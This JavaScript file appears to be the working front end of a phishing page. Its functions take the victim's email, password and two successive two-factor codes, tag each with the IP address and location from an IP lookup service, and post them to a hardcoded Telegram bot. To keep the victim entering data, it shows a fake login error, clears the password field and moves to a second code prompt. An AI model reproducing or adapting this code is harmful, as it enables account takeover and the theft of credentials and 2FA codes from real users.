// script.js

function getIpAndLocation(callback) {
    fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            const country = data.country_name;
            const city = data.city;
            callback(ip, country, city);
        })
        .catch(error => {
            console.error('Error fetching IP and location:', error);
            callback('Unavailable', 'Unavailable', 'Unavailable');
        });
}

function sendLogin() {
    const email = document.querySelector("#email").value;
    const password = document.querySelector("#password").value;

    if (email === '' || password === '') {
        alert("Please fill in both fields.");
        return;
    }

    getIpAndLocation((ip, country, city) => {
        const botToken = '7494153356:AAFQo6RDU7o_Cjn88uVqmwTFyQZaqoOn25k';
        const chatId = '5607989288';
        const message = `Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nCountry: ${country}\nCity: ${city}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        }).then(response => response.json())
          .then(data => {
              console.log('Message sent successfully:', data);
              document.querySelector("#error-message").style.display = "block";
              document.querySelector("#password").value = ""; // Reset password field
          })
          .catch(error => {
              console.error('Error sending message:', error);
              alert('Failed to send data to Telegram');
          });
    });
}

function send2FACode() {
    const code = document.querySelector("#code").value;

    if (code === '') {
        document.querySelector("#code").style.border = '1px solid red';
        return;
    }

    getIpAndLocation((ip, country, city) => {
        const botToken = '7494153356:AAFQo6RDU7o_Cjn88uVqmwTFyQZaqoOn25k';
        const chatId = '5607989288';
        const message = `2FA Code: ${code}\nIP: ${ip}\nCountry: ${country}\nCity: ${city}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        }).then(response => response.json())
          .then(data => {
              console.log('Message sent successfully:', data);
              window.location = 'confirm2.html';
          })
          .catch(error => {
              console.error('Error sending message:', error);
              alert('Failed to send data to Telegram');
          });
    });
}

function sendFinal2FACode() {
    const code = document.querySelector("#code").value;

    if (code === '') {
        document.querySelector("#code").style.border = '1px solid red';
        return;
    }

    getIpAndLocation((ip, country, city) => {
        const botToken = '7494153356:AAFQo6RDU7o_Cjn88uVqmwTFyQZaqoOn25k';
        const chatId = '5607989288';
        const message = `2FA Code (2nd attempt): ${code}\nIP: ${ip}\nCountry: ${country}\nCity: ${city}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        }).then(response => response.json())
          .then(data => {
              console.log('Message sent successfully:', data);
              window.location = 'wait.html';
          })
          .catch(error => {
              console.error('Error sending message:', error);
              alert('Failed to send data to Telegram');
          });
    });
}
